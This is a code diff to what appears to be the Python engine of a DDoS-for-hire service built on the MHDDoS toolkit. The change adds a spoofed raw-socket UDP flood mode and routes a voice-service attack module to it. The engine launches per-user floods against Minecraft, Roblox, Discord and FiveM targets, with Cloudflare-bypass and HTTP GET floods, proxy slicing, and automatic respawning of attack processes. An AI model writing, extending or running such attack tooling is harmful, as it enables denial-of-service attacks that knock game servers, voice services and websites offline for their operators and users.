@@ -8,9 +8,10 @@ from config import (
     MHDDOS_FULL, MHDDOS_DIR, MHDDOS_LAUNCHER,
     SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE, RPC_PER_SUB_NODE,
     MAX_RESPAWN_ATTEMPTS, RESPAWN_DELAY, ATTACK_LOG_DIR,
-    ENABLE_MULTI_VECTOR, VOICE_PORT_MIN, VOICE_PORT_MAX,
-    proxy_slice_file,
+    proxy_slice_file, BASE_DIR,
 )
+
+RAWUDP = os.path.join(BASE_DIR, "rawudp.py")
 
 MODULE_MAP = {
     "minecraft":  ("L4", "MCBOT",     {}),
@@ -21,8 +22,7 @@ MODULE_MAP = {
     "web_cf":     ("L7", "CFB",       {}),
     "web_bypass": ("L7", "BYPASS",    {}),
     "http_flood": ("L7", "GET",       {}),
-    # Voice stutter — ยิง UDP + ICMP + AMP พร้อมกัน
-    "voice_amp":  ("L4", "UDP",       {"amp": True}),
+    "voice_amp":  ("RAW", "RAWUDP",   {}),   # ← raw socket spoof
 }
 
 L4_MODULES = {"minecraft", "roblox", "discord", "fivem", "voice_amp"}
@@ -32,10 +32,9 @@ class MHDDoSEngine:
     def __init__(self):
         self.running: dict[int, list[dict]] = {}
 
-    def _build_args(self, method: str, layer: str, target: str, port: int,
-                    duration: int, threads: int,
-                    proxies_path: str, rpc: int,
-                    amp: bool = False) -> list[str]:
+    def _build_mhddos_args(self, method: str, layer: str, target: str,
+                           port: int, duration: int, threads: int,
+                           proxies_path: str, rpc: int) -> list[str]:
         if layer == "L7":
             host = target if target.startswith("http") else f"http://{target}"
             if port and ":" not in host.split("//")[-1]:
@@ -46,29 +45,37 @@ class MHDDoSEngine:
             host = target.split("//")[-1].split("/")[0]
             if ":" not in host:
                 host = f"{host}:{port}"
-            args = [method, host, str(threads), str(duration)]
-            if amp:
-                args.append("amp")  # signal ให้ MHDDoS ใช้ amplification
-            return args
+            return [method, host, str(threads), str(duration)]
+
+    def _build_rawudp_args(self, target: str, port: int,
+                           duration: int, threads: int) -> list[str]:
+        # rawudp.py <IP> <PORT> [THREADS] [DURATION] [PKT]
+        host = target.split("//")[-1].split("/")[0].split(":")[0]
+        return [host, str(port), str(threads), str(duration), "1400"]
 
     async def _spawn_node(self, user_id: int, node_idx: int,
-                          args: list[str]) -> dict:
+                          cmd_head: list[str], args: list[str]) -> dict:
         os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
         log_path = os.path.join(
             ATTACK_LOG_DIR, f"{user_id}_{node_idx}_{int(time.time())}.log"
         )
         log_f = open(log_path, "wb")
 
-        cmd = [sys.executable, MHDDOS_LAUNCHER] + args
         proc = await asyncio.create_subprocess_exec(
-            *cmd,
+            *cmd_head, *args,
             stdout=log_f,
             stderr=asyncio.subprocess.STDOUT,
             cwd=MHDDOS_DIR,
         )
         log_f.close()
-        return {"proc": proc, "args": args, "log_path": log_path,
-                "respawns": 0, "node_idx": node_idx}
+        return {
+            "proc": proc,
+            "cmd_head": cmd_head,
+            "args": args,
+            "log_path": log_path,
+            "respawns": 0,
+            "node_idx": node_idx,
+        }
 
     async def start(self, user_id: int, module: str, target: str, port: int,
                     duration: int, devices: int,
@@ -79,25 +86,36 @@ class MHDDoSEngine:
         info = MODULE_MAP.get(module)
         if not info:
             raise ValueError(f"unknown module: {module}")
-        layer, method, extra = info
+        layer, method, _ = info
 
         sub_nodes = devices * SUB_NODES_PER_DEVICE
 
+        # เตรียม slice file
         for i in range(sub_nodes):
             data = proxy_slices[i] if i < len(proxy_slices) else []
-            path = proxy_slice_file(user_id, i)
-            with open(path, "w") as f:
+            with open(proxy_slice_file(user_id, i), "w") as f:
                 f.write("\n".join(data))
 
         nodes: list[dict] = []
         for i in range(sub_nodes):
-            args = self._build_args(
-                method, layer, target, port, duration,
-                THREADS_PER_SUB_NODE, proxy_slice_file(user_id, i),
-                RPC_PER_SUB_NODE, amp=extra.get("amp", False),
-            )
+            if layer == "RAW":
+                # raw socket spoofed
+                cmd_head = [sys.executable, RAWUDP]
+                args = self._build_rawudp_args(
+                    target, port, duration,
+                    max(50, THREADS_PER_SUB_NODE),
+                )
+            else:
+                cmd_head = [sys.executable, MHDDOS_LAUNCHER]
+                args = self._build_mhddos_args(
+                    method, layer, target, port, duration,
+                    THREADS_PER_SUB_NODE,
+                    proxy_slice_file(user_id, i),
+                    RPC_PER_SUB_NODE,
+                )
+
             try:
-                node = await self._spawn_node(user_id, i, args)
+                node = await self._spawn_node(user_id, i, cmd_head, args)
                 nodes.append(node)
             except Exception:
                 traceback.print_exc()
@@ -115,7 +133,7 @@ class MHDDoSEngine:
         await asyncio.sleep(RESPAWN_DELAY)
         try:
             new_node = await self._spawn_node(
-                user_id, node["node_idx"], node["args"]
+                user_id, node["node_idx"], node["cmd_head"], node["args"]
             )
             new_node["respawns"] = node["respawns"] + 1
             nodes = self.running.get(user_id, [])
